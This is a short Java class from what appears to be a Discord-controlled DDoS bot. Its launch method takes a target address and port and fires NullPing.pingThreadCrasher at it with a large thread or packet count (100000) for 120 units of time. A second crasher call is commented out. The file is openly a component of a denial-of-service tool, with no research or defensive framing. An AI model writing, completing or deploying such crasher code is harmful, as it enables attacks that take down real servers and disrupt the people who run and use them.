package neko.itskekoff.discordddosbot_default.manager.impl;

import neko.itskekoff.discordddosbot_default.helpers.CommandExecutor;
import neko.itskekoff.discordddosbot_default.helpers.NullPing;
import neko.itskekoff.discordddosbot_default.manager.AttackManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

public class run implements AttackManager {
    @Override
    public void launch(String ip, int time) throws IOException, InterruptedException, URISyntaxException {
        System.out.println("Started!");
        //DdosModCrasher.launch(ip, time);
        NullPing.pingThreadCrasher(ip.split(":")[0], Integer.parseInt(ip.split(":")[1]), 100000, 120);
    }
}
